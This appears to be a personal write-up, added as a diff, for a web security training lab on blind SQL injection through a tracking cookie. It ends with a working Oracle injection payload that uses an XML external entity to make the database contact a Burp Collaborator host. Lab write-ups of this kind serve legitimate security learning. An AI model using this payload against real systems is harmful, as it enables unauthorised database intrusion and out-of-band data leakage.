@@ -1,0 +1,22 @@
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+Note
+
+To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+
+Hint:  You can find some useful payloads on our SQL injection cheat sheet. 
+
+End Goal:
+- Exploit SQLi and cause a DNS lookup
+
+Analysis:
+---------
+
+- Open Burp Collaborator 
+
+rzuv0qy7032ywluh7twnpidb026tuji8.oastify.com
+
+'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://rzuv0qy7032ywluh7twnpidb026tuji8.oastify.com/"> %remote;]>'),'/l') FROM dual)--
